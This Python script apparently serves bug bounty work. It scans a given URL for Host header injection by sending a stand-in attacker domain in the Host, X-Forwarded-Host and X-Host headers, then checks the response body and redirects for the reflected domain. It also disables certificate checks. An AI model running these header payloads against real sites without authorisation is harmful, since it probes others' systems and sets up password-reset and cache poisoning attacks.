import requests
import sys

def scan_host_poisoning(target_url):
    print(f"\n[*] Bhai, starting Host Header Poisoning Scan on: {target_url}")
    print("[*] Hunting for Password Reset Poisoning and Cache Poisoning via Host headers...\n")
    print("--------------------------------------------------")

    # The Hacker's Poison Domain
    evil_domain = "archsammi-evil-hacker.com"
    
    # Hum 3 alag-alag headers test karenge kyunki WAFs kabhi-kabhi 'Host' ko block kar dete hain
    payloads = [
        {"Host": evil_domain},
        {"X-Forwarded-Host": evil_domain},
        {"X-Host": evil_domain}
    ]

    vulnerable = False

    for headers_payload in payloads:
        # User-Agent add kar rahe hain normal dikhne ke liye
        headers_payload['User-Agent'] = 'Mozilla/5.0 (X11; Arch Linux x86_64)'
        header_name = list(headers_payload.keys())[0]
        
        print(f"[*] Injecting Poison via -> {header_name}: {evil_domain}")
        
        try:
            # We use verify=False to ignore SSL errors on test sites, timeout is 5 secs
            response = requests.get(target_url, headers=headers_payload, timeout=5, verify=False)
            
            # THE MAGIC LOGIC:
            # Agar humara evil domain server ke response mein reflect ho gaya (jaise kisi link ya tag mein)
            # iska matlab server humare Host header par aankh band karke bharosa kar raha hai!
            if evil_domain in response.text:
                print(f"\n   [!!!] JACKPOT 🎯 HOST HEADER INJECTION FOUND!")
                print(f"   [!!!] The server blindly trusts the '{header_name}' header.")
                print("   [!!!] Impact: Highly vulnerable to Password Reset Poisoning & Web Cache Poisoning.")
                print(f"   [!!!] Proof: Found '{evil_domain}' reflected in the response body!\n")
                vulnerable = True
                
            # Sometimes it reflects in the Location header (Redirects)
            elif 'Location' in response.headers and evil_domain in response.headers['Location']:
                print(f"\n   [!!!] BINGO 🎯 OPEN REDIRECT VIA HOST HEADER FOUND!")
                print(f"   [!!!] Header used: {header_name}")
                print(f"   [!!!] The server redirects users to our evil domain: {response.headers['Location']}\n")
                vulnerable = True
                
            else:
                print("   [-] Secure. Payload was ignored or stripped.\n")

        except requests.exceptions.RequestException as e:
            print(f"   [-] Connection skipped/timeout: {e}\n")

    print("--------------------------------------------------")
    if vulnerable:
        print("[+] Scan Complete! Target is VULNERABLE. Time to write a P2/P3 Bug Bounty report! 💸")
    else:
        print("[-] Scan Complete. Target handles Host headers securely.")

if __name__ == "__main__":
    # Suppress insecure HTTPS request warnings for clean terminal output
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    if len(sys.argv) != 2:
        print("Usage: python3 host_poisoner.py <target_url>")
        print("Example: python3 host_poisoner.py http://testphp.vulnweb.com/login.php")
        sys.exit(1)
        
    target = sys.argv[1]
    scan_host_poisoning(target)
